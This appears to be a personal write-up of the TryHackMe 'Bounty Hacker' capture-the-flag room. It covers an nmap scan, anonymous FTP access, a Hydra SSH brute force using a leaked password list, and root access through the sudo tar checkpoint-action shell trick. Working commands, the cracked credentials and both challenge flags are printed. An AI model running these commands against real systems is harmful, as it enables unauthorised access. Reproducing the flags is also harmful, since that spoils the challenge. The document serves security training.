### Target Name: Bounty Hacker

### Target IP: `inconsistent (different TryHackMe sessions)`

### Attacker IP: `inconsistent (different TryHackMe sessions)`

# -- Scanning & Enumeration --

# Open Ports

```
PORT    STATE  SERVICE
20/tcp  closed ftp-data
21/tcp  open   ftp
22/tcp  open   ssh
80/tcp  open   http
990/tcp closed ftps

┌──(root㉿kali)-[/home/kali/Downloads]
└─# nmap -p20,21,22,80,990 -T4 -sC -sV 10.113.131.225

PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.133.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b7:15:f2:57:39:19:be:ed:ad:0f:f9:ae:b8:82:96:67 (RSA)
|   256 e9:78:b0:bd:47:ac:b1:35:53:61:a1:1e:3c:80:9f:15 (ECDSA)
|_  256 75:08:02:a6:3b:7f:55:5e:0a:95:b9:c6:51:32:35:f0 (ED25519)
80/tcp  open   http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
990/tcp closed ftps
```

# Operating System & Service Versions (+ additional info)

```
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# FTP (21/TCP)

## via FTP

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ftp 10.114.144.30
```

#### anonymous login successful

```
Connected to 10.114.144.30.
220 (vsFTPd 3.0.5)
Name (10.114.144.30:kali): anonymous
230 Login successful.
aRemote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

#### file download successful (for all files)

```
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

```
ftp> mget *
mget locks.txt [anpqy?]? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |***************************************************************************************************|   418        4.63 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (0.55 KiB/s)
mget task.txt [anpqy?]? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |***************************************************************************************************|    68      800.07 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.88 KiB/s)
ftp>
```

#### task.txt reveals potential usernames

```
┌──(kali㉿kali)-[~]
└─$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

#### locks.txt very likely a password list

```
┌──(kali㉿kali)-[~]
└─$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

---

# -- Exploitation --

## via CLI

#### construct a username list from task.txt with 'lin' being the most likely (first)

```
┌──(kali㉿kali)-[~]
└─$ echo "lin\nLin\nVicious\nvicious\nRedEye\nredeye\nredEye\nRedeye" > usrlist.txt
```

```
┌──(kali㉿kali)-[~]
└─$ cat usrlist.txt
lin
Lin
Vicious
vicious
RedEye
redeye
redEye
Redeye
```

## via Hydra

#### bruteforce ssh with found usernames and passwords

```
┌──(kali㉿kali)-[~]
└─$ hydra -L usrlist.txt -P locks.txt ssh://10.114.173.26 -t 4 -V -I

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
...
[DATA] attacking ssh://10.114.173.26:22/
[ATTEMPT] target 10.114.173.26 - login "lin" - pass "rEddrAGON" - 1 of 208
...
[22][ssh] host: 10.114.173.26   login: lin   password: RedDr4gonSynd1cat3
``` 

## via SSH

#### connect using the found credentials & grab the first flag

```
┌──(kali㉿kali)-[~]
└─$ ssh lin@10.114.173.26
...
lin@10.114.173.26's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
...
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-114-173-26:~/Desktop$ ls
user.txt
lin@ip-10-114-173-26:~/Desktop$ cat user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

---

# -- Post-Exploitation --

## Privilege Escalation

### PrivEsc Vectors Investigation

#### looking at .bash_history in the home directory

```
lin@ip-10-114-173-26:~$ cat .bash_history
cat .bash_history
ls
cd ..
cat .bash_history
ls
ls -al
clear
exit
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### check if tar actually is run'able as root & find out it is

```
lin@ip-10-114-173-26:~$ sudo -l
[sudo] password for lin:
...
User lin may run the following commands on ip-10-114-173-26:
    (root) /bin/tar
lin@ip-10-114-173-26:~$
```

**vector: the user previously executed /bin/sh as root using the `checkpoint-action` feature of `tar`**

### Applying found vectors

#### running the command, landing root & grabbing the flag

```
lin@ip-10-114-173-26:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names

# whoami
root

# cd /root     	

# ls
root.txt  snap

# cat root.txt
THM{80UN7Y_h4cK3r}
```

---
